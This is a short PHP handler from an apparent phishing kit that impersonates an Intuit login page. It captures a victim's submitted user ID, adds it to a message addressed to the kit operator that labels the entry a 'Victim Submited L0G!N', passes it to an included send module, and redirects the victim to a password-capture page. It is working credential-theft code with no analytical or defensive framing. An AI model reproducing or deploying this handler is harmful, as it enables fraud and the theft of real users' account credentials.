<?php
require_once('./Module/Setmodule.php');
$message .= "|Wassup, $yourname|| #Victim Submited L0G!N to your INTUIT page \n"."\n";
$message .= "|User ID: ".$_POST['userid']."\n\n"; 

require_once('Module/SendModule.php');


	
	
	header("Location: ../pass1.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  
  
?>
